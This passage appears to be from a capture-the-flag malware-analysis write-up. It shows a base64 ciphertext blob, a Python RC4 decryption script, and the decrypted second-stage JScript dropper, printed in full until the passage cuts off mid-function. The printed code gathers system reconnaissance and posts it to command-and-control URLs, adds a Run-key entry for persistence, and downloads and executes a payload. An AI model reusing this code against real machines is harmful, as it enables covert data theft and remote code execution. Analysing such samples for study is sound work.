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";
    return r
}
```
</details>

With the key, I made a simple script to decrypt the ciphertext.

```python
import base64

# Function to decode base64 data
def decode_base64(data):
    return base64.b64decode(data)

# Function to decrypt the data
def decrypt_data(key, data):
    t = list(range(256))
    l = 0
    h = 0
    decrypted_string = b""

    # Initialize array t
    for i in range(256):
        t[i] = i

    # Key scheduling algorithm
    for i in range(256):
        l = (l + t[i] + ord(key[i % len(key)])) % 256
        h = t[i]
        t[i] = t[l]
        t[l] = h

    i = 0
    j = 0

    # Pseudo-random generation algorithm (PRGA) to generate key stream
    for k in range(len(data)):
        i = (i + 1) % 256
        j = (j + t[i]) % 256
        h = t[i]
        t[i] = t[j]
        t[j] = h
        decrypted_string += bytes([data[k] ^ t[(t[i] + t[j]) % 256]])

    return decrypted_string.decode('utf-8')

# Read the encoded data from the file
with open('ciphertext.txt', 'r') as file:
    encoded_data = file.read()

# Decode base64 data
decoded_data = decode_base64(encoded_data.encode())

# Key
key = "vF8rdgMHKBrvCoCp0ulm"

# Decrypt the data
decrypted_data = decrypt_data(key, decoded_data)

with open('out.js', 'w') as outfile:
    outfile.write(decrypted_data)

print("Decrypted data has been written to out.js.")
```

We are given ANOTHER Javascript file. However, thankfully the flag is static and no reversing was needed.

<details>
<summary>
Second Javascript file
</summary>

```js
function S7EN(KL3M) {
    var gfjd = WScript.CreateObject("ADODB.Stream");
    gfjd.Type = 2;
    gfjd.CharSet = "437";
    gfjd.Open();
    gfjd.LoadFromFile(KL3M);
    var j3k6 = gfjd.ReadText;
    gfjd.Close();
    return l9BJ(j3k6)
}
var WQuh = new Array("http://challenge.htb/wp-includes/pomo/db.php", "http://challenge.htb/wp-admin/includes/class-wp-upload-plugins-list-table.php");
var zIRF = "KRMLT0G3PHdYjnEm";
var LwHA = new Array("systeminfo > ", "net view >> ", "net view /domain >> ", "tasklist /v >> ", "gpresult /z >> ", "netstat -nao >> ", "ipconfig /all >> ", "arp -a >> ", "net share >> ", "net use >> ", "net user >> ", "net user administrator >> ", "net user /domain >> ", "net user administrator /domain >> ", "set  >> ", "dir %systemdrive%\\Users\\*.* >> ", "dir %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.* >> ", "dir %userprofile%\\Desktop\\*.* >> ", 'tasklist /fi "modules eq wow64.dll"  >> ', 'tasklist /fi "modules ne wow64.dll" >> ', 'dir "%programfiles(x86)%" >> ', 'dir "%programfiles%" >> ', "dir %appdata% >>");
var Z6HQ = new ActiveXObject("Scripting.FileSystemObject");
var EBKd = WScript.ScriptName;
var Vxiu = "";
var lDd9 = a0rV();

function DGbq(xxNA, j5zO) {
    char_set = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    var bzwO = "";
    var sW_c = "";
    for (var i = 0; i < xxNA.length; ++i) {
        var W0Ce = xxNA.charCodeAt(i);
        var o_Nk = W0Ce.toString(2);
        while (o_Nk.length < (j5zO ? 8 : 16)) o_Nk = "0" + o_Nk;
        sW_c += o_Nk;
        while (sW_c.length >= 6) {
            var AaP0 = sW_c.slice(0, 6);
            sW_c = sW_c.slice(6);
            bzwO += this.char_set.charAt(parseInt(AaP0, 2))
        }
    }
    if (sW_c) {
        while (sW_c.length < 6) sW_c += "0";
        bzwO += this.char_set.charAt(parseInt(sW_c, 2))
    }
    while (bzwO.length % (j5zO ? 4 : 8) != 0) bzwO += "=";
    return bzwO
}
var lW6t = [];
lW6t["C7"] = "80";
lW6t["FC"] = "81";
lW6t["E9"] = "82";
lW6t["E2"] = "83";
lW6t["E4"] = "84";
lW6t["E0"] = "85";
lW6t["E5"] = "86";
lW6t["E7"] = "87";
lW6t["EA"] = "88";
lW6t["EB"] = "89";
lW6t["E8"] = "8A";
lW6t["EF"] = "8B";
lW6t["EE"] = "8C";
lW6t["EC"] = "8D";
lW6t["C4"] = "8E";
lW6t["C5"] = "8F";
lW6t["C9"] = "90";
lW6t["E6"] = "91";
lW6t["C6"] = "92";
lW6t["F4"] = "93";
lW6t["F6"] = "94";
lW6t["F2"] = "95";
lW6t["FB"] = "96";
lW6t["F9"] = "97";
lW6t["FF"] = "98";
lW6t["D6"] = "99";
lW6t["DC"] = "9A";
lW6t["A2"] = "9B";
lW6t["A3"] = "9C";
lW6t["A5"] = "9D";
lW6t["20A7"] = "9E";
lW6t["192"] = "9F";
lW6t["E1"] = "A0";
lW6t["ED"] = "A1";
lW6t["F3"] = "A2";
lW6t["FA"] = "A3";
lW6t["F1"] = "A4";
lW6t["D1"] = "A5";
lW6t["AA"] = "A6";
lW6t["BA"] = "A7";
lW6t["BF"] = "A8";
lW6t["2310"] = "A9";
lW6t["AC"] = "AA";
lW6t["BD"] = "AB";
lW6t["BC"] = "AC";
lW6t["A1"] = "AD";
lW6t["AB"] = "AE";
lW6t["BB"] = "AF";
lW6t["2591"] = "B0";
lW6t["2592"] = "B1";
lW6t["2593"] = "B2";
lW6t["2502"] = "B3";
lW6t["2524"] = "B4";
lW6t["2561"] = "B5";
lW6t["2562"] = "B6";
lW6t["2556"] = "B7";
lW6t["2555"] = "B8";
lW6t["2563"] = "B9";
lW6t["2551"] = "BA";
lW6t["2557"] = "BB";
lW6t["255D"] = "BC";
lW6t["255C"] = "BD";
lW6t["255B"] = "BE";
lW6t["2510"] = "BF";
lW6t["2514"] = "C0";
lW6t["2534"] = "C1";
lW6t["252C"] = "C2";
lW6t["251C"] = "C3";
lW6t["2500"] = "C4";
lW6t["253C"] = "C5";
lW6t["255E"] = "C6";
lW6t["255F"] = "C7";
lW6t["255A"] = "C8";
lW6t["2554"] = "C9";
lW6t["2569"] = "CA";
lW6t["2566"] = "CB";
lW6t["2560"] = "CC";
lW6t["2550"] = "CD";
lW6t["256C"] = "CE";
lW6t["2567"] = "CF";
lW6t["2568"] = "D0";
lW6t["2564"] = "D1";
lW6t["2565"] = "D2";
lW6t["2559"] = "D3";
lW6t["2558"] = "D4";
lW6t["2552"] = "D5";
lW6t["2553"] = "D6";
lW6t["256B"] = "D7";
lW6t["256A"] = "D8";
lW6t["2518"] = "D9";
lW6t["250C"] = "DA";
lW6t["2588"] = "DB";
lW6t["2584"] = "DC";
lW6t["258C"] = "DD";
lW6t["2590"] = "DE";
lW6t["2580"] = "DF";
lW6t["3B1"] = "E0";
lW6t["DF"] = "E1";
lW6t["393"] = "E2";
lW6t["3C0"] = "E3";
lW6t["3A3"] = "E4";
lW6t["3C3"] = "E5";
lW6t["B5"] = "E6";
lW6t["3C4"] = "E7";
lW6t["3A6"] = "E8";
lW6t["398"] = "E9";
lW6t["3A9"] = "EA";
lW6t["3B4"] = "EB";
lW6t["221E"] = "EC";
lW6t["3C6"] = "ED";
lW6t["3B5"] = "EE";
lW6t["2229"] = "EF";
lW6t["2261"] = "F0";
lW6t["B1"] = "F1";
lW6t["2265"] = "F2";
lW6t["2264"] = "F3";
lW6t["2320"] = "F4";
lW6t["2321"] = "F5";
lW6t["F7"] = "F6";
lW6t["2248"] = "F7";
lW6t["B0"] = "F8";
lW6t["2219"] = "F9";
lW6t["B7"] = "FA";
lW6t["221A"] = "FB";
lW6t["207F"] = "FC";
lW6t["B2"] = "FD";
lW6t["25A0"] = "FE";
lW6t["A0"] = "FF";

function a0rV() {
    var YrUH = Math.ceil(Math.random() * 10 + 25);
    var name = String.fromCharCode(Math.ceil(Math.random() * 24 + 65));
    var JKfG = WScript.CreateObject("WScript.Network");
    Vxiu = JKfG.UserName;
    for (var count = 0; count < YrUH; count++) {
        switch (Math.ceil(Math.random() * 3)) {
            case 1:
                name = name + Math.ceil(Math.random() * 8);
                break;
            case 2:
                name = name + String.fromCharCode(Math.ceil(Math.random() * 24 + 97));
                break;
            default:
                name = name + String.fromCharCode(Math.ceil(Math.random() * 24 + 65));
                break
        }
    }
    return name
}
var icVh = Jp6A(HAP5());
try {
    var CJPE = HAP5();
    W6cM();
    Syrl()
} catch (e) {
    WScript.Quit()
}

function Syrl() {
    var m2n0 = xhOC();
    while (true) {
        for (var i = 0; i < WQuh.length; i++) {
            var bx_4 = WQuh[i];
            var czlA = V9iU(bx_4, m2n0);
            switch (czlA) {
                case "good":
                    break;
                case "exit":
                    WScript.Quit();
                    break;
                case "work":
                    eRNv(bx_4);
                    break;
                case "fail":
                    I7UO();
                    break;
                default:
                    break
            }
            a0rV()
        }
        WScript.Sleep((Math.random() * 300 + 3600) * 1e3)
    }
}

function HAP5() {
    var zkDC = this["ActiveXObject"];
    var jVNP = new zkDC("WScript.Shell");
    return jVNP
}

function eRNv(caA2) {
    var jpVh = icVh + EBKd.substring(0, EBKd.length - 2) + "pif";
    var S47T = new ActiveXObject("MSXML2.XMLHTTP");
    S47T.OPEN("post", caA2, false);
    S47T.SETREQUESTHEADER("user-agent:", "Mozilla/5.0 (Windows NT 6.1; Win64; x64); " + he50());
    S47T.SETREQUESTHEADER("content-type:", "application/octet-stream");
    S47T.SETREQUESTHEADER("content-length:", "4");
    S47T.SETREQUESTHEADER("Cookie:", "flag=SFRCe200bGQwY3NfNHIzX2czdHQxbmdfVHIxY2tpMTNyfQo=");
    S47T.SEND("work");
    if (Z6HQ.FILEEXISTS(jpVh)) {
        Z6HQ.DELETEFILE(jpVh)
    }
    if (S47T.STATUS == 200) {
        var gfjd = new ActiveXObject("ADODB.STREAM");
        gfjd.TYPE = 1;
        gfjd.OPEN();
        gfjd.WRITE(S47T.responseBody);
        gfjd.Position = 0;
        gfjd.Type = 2;
        gfjd.CharSet = "437";
        var j3k6 = gfjd.ReadText(gfjd.Size);
        var RAKT = t7Nl("2f532d6baec3d0ec7b1f98aed4774843", l9BJ(j3k6));
        Trql(RAKT, jpVh);
        gfjd.Close()
    }
    var lDd9 = a0rV();
    nr3z(jpVh, caA2);
    WScript.Sleep(3e4);
    Z6HQ.DELETEFILE(jpVh)
}

function I7UO() {
    Z6HQ.DELETEFILE(WScript.SCRIPTFULLNAME);
    CJPE.REGDELETE("HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\run\\" + EBKd.substring(0, EBKd.length - 3));
    WScript.Quit()
}

function V9iU(pxug, tqDX) {
    try {
        var S47T = new ActiveXObject("MSXML2.XMLHTTP");
        S47T.OPEN("post", pxug, false);
        S47T.SETREQUESTHEADER("user-agent:", "Mozilla/5.0 (Windows NT 6.1; Win64; x64); " + he50());
        S47T.SETREQUESTHEADER("content-type:", "application/octet-stream");
        var SoNI = DGbq(tqDX, true);
        S47T.SETREQUESTHEADER("content-length:", SoNI.length);
        S47T.SEND(SoNI);
        return S47T.responseText
    } catch (e) {
        return ""
    }
}

function he50() {
    var wXgO = "";
    var JKfG = WScript.CreateObject("WScript.Network");
    var SoNI = zIRF + JKfG.ComputerName + Vxiu;
    for (var i = 0; i < 16; i++) {
        var DXHy = 0;
        for (var j = i; j < SoNI.length - 1; j++) {
            DXHy = DXHy ^ SoNI.charCodeAt(j)
        }
        DXHy = DXHy % 10;
        wXgO = wXgO + DXHy.toString(10)
    }
    wXgO = wXgO + zIRF;
    return wXgO
}

function W6cM() {
    v_FileName = icVh + EBKd.substring(0, EBKd.length - 2) + "js";
    Z6HQ.COPYFILE(WScript.ScriptFullName, icVh + EBKd);
    var zIqu = (Math.random() * 150 + 350) * 1e3;
    WScript.Sleep(zIqu);
    CJPE.REGWRITE("HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\run\\" + EBKd.substring(0, EBKd.length - 3), "wscript.exe //B " + String.fromCharCode(34) + icVh + EBKd + String.fromCharCode(34) + " NPEfpRZ4aqnh1YuGwQd0", "REG_SZ")
}

function xhOC() {
    var U5rJ = icVh + "~dat.tmp";
    for (var i = 0; i < LwHA.length; i++) {
        CJPE.Run("cmd.exe /c " + LwHA[i] + '"' + U5rJ + "", 0, true)
    }
    var jxHd = S7EN(U5rJ);
    WScript.Sleep(1e3);
    Z6HQ.DELETEFILE(U5rJ);
    return t7Nl("2f532d6baec3d0ec7b1f98aed4774843", jxHd)
}

function nr3z(jpVh, caA2) {
    try {
        if (Z6HQ.FILEEXISTS(jpVh)) {
            CJPE.Run('"' + jpVh + '"')
        }
    } catch (e) {
        var S47T = new ActiveXObject("MSXML2.XMLHTTP");
        S47T.OPEN("post", caA2, false);
        var ND3M = "error";
        S47T.SETREQUESTHEADER("user-agent:", "Mozilla/5.0 (Windows NT 6.1; Win64; x64); " + he50());
        S47T.SETREQUESTHEADER("content-type:", "application/octet-stream");
        S47T.SETREQUESTHEADER("content-length:", ND3M.length);
        S47T.SEND(ND3M);
